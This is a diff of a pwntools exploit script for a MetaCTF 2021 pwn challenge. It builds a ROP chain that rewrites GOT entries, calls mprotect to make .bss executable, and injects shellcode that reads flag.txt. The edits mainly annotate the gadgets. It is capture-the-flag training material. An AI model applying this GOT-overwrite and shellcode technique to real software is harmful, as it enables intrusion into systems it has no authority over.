@@ -49,69 +49,79 @@ io = start()
 
 payload = flat({
   16:[
-    # change __isoc99_scanf to gadget3
+    # the last code in read_bytes
+     '''
+     add rsp, 0x10
+     pop rbx        ; to control rbx
+     pop rbp
+     mov r12, qword ptr [rsp]
+     add rsp, 8
+     ret
+     '''
+    # change __isoc99_scanf to gadget3-pop rdi, ret
     gadget3 - libc.symbols['__isoc99_scanf'],
     p64(0)*2,
     pop_rbp,
     elf.got['__isoc99_scanf'] + 0x3d,
     gadget_add,
 
-    # change setvbuf to gadget7
+    # change setvbuf to gadget7-mov rax, rbp; pop rbp; ret;
     add_addr(elf.got['setvbuf'], gadget7 - libc.sym['setvbuf']),
     # set rbp=0x1000
     pop_rbp, 0x1000,
     # ser rax = rbp
     elf.sym['setvbuf'], 0,
-    # change setvbuf to gadget6
+      
+    # change setvbuf to gadget6-xchg eax, esi; ret;
     add_addr(elf.got['setvbuf'], gadget6 - gadget7),
     # set esi = eax = 0x1000
     elf.sym['setvbuf'],
 
-    # change setvbuf to gadget4
+    # change setvbuf to gadget4-pop rdx ; ret
     add_addr(elf.got['setvbuf'], (gadget4-gadget6)),
     # set rdi = 0x404000 ,  then  set rdx = 7
     elf.symbols['__isoc99_scanf'], 0x404000,
     elf.symbols['setvbuf'], 7,
 
-    # change __isoc99_scanf to gadget7
+    # change __isoc99_scanf to gadget7-mov rax, rbp; pop rbp; ret
     add_addr(elf.got['__isoc99_scanf'], (gadget7-gadget3)),
     # set rbp=10  then rax=rbp
     pop_rbp, 10,
     elf.symbols['__isoc99_scanf'], 0,
 
-    # change __isoc99_scanf to gadget8
+    # change __isoc99_scanf to gadget8-syscall; ret
     add_addr(elf.got['__isoc99_scanf'], (gadget8-gadget7)),
     # syscall -> mprotect(0x404000, 0x1000, 7) --> set bss to RWX
     elf.symbols['__isoc99_scanf'],
 
-    # change __isoc99_scanf to gadget3
+    # change __isoc99_scanf to gadget3-pop rdi, ret
     add_addr(elf.got['__isoc99_scanf'], (gadget3-gadget8)),
     # set rdi = 0
     elf.symbols['__isoc99_scanf'], 0,
 
-    # change __isoc99_scanf to gadget7
+    # change __isoc99_scanf to gadget7-mov rax, rbp; pop rbp; ret
     add_addr(elf.got['__isoc99_scanf'], (gadget7-gadget3)),
     # set rbp = 0x404800, then rax = rbp
     pop_rbp, 0x404800,
     elf.symbols['__isoc99_scanf'], 0,
 
-    # change __isoc99_scanf to gadget6
+    # change __isoc99_scanf to gadget6-xchg eax, esi; ret
     add_addr(elf.got['__isoc99_scanf'], (gadget6-gadget7)),
     # set rsi = 0x404800
     elf.symbols['__isoc99_scanf'],
 
-    # change __isoc99_scanf to gadget4
+    # change __isoc99_scanf to gadget4-pop rdx ; ret
     add_addr(elf.got['__isoc99_scanf'], (gadget4-gadget6)),
     # set rdx = 0x100
     elf.symbols['__isoc99_scanf'], 0x100,
 
-    # change __isoc99_scanf to gadget7
+    # change __isoc99_scanf to gadget7-mov rax, rbp; pop rbp; ret
     add_addr(elf.got['__isoc99_scanf'], (gadget7-gadget4)),
     # set rbp = 0 ,  then rax = rbp
     pop_rbp, 0,
     elf.symbols['__isoc99_scanf'], 0,
 
-    # change __isoc99_scanf to gadget8
+    # change __isoc99_scanf to gadget8-syscall; ret
     add_addr(elf.got['__isoc99_scanf'], (gadget8-gadget7)),
     # syscall -->  read(0, 0x404800, 0x100)
     elf.symbols['__isoc99_scanf'],
@@ -121,8 +131,6 @@ payload = flat({
 })
 io.sendlineafter('bytes?\n', str(len(payload)))
 io.send(payload)
-
 io.send(asm(shellcraft.readfile('./flag.txt',1)))
-
 io.stream()
 # https://github.com/nobodyisnobody/write-ups/tree/main/MetaCtf.2021/pwn/A.Attempt.Was.Made
